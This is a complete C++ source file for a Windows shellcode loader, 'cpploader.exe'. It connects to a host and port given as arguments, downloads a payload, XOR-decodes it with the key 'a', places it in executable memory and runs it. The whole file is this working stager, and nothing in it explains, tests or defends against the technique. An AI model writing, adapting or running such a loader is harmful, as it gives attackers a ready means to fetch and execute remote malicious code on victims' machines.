#include <winsock2.h>
#include <ws2tcpip.h> 
#include <windows.h>
#include <iostream>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(linker, "/INCREMENTAL:NO")

int shellcode(PCSTR host, u_short port)
{
	char buf[4096];
	WORD version = MAKEWORD(2, 2);
	WSADATA data;
	WSAStartup(version, &data);
	SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);
	inet_pton(AF_INET, host, & addr.sin_addr);
	connect(sock, (sockaddr*)& addr, sizeof(addr));
	recv(sock, buf, 4096, NULL);
	closesocket(sock);
	WSACleanup();
	for (int i = 0; i != sizeof(buf) / sizeof(buf[0]); i++) {
		buf[i] = buf[i] ^ 'a';
	}
	LPVOID Memory = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memcpy(Memory, buf, sizeof(buf));
	((void(*)())Memory)();
	return 0;
}

int main(int argc, char** argv) {
	if (argc != 3) {
		std::cout << "cpploader.exe 192.168.1.1 5555" << std::endl;
	}
	else {
		shellcode(argv[1], atoi(argv[2]));
	}
	return 0;
}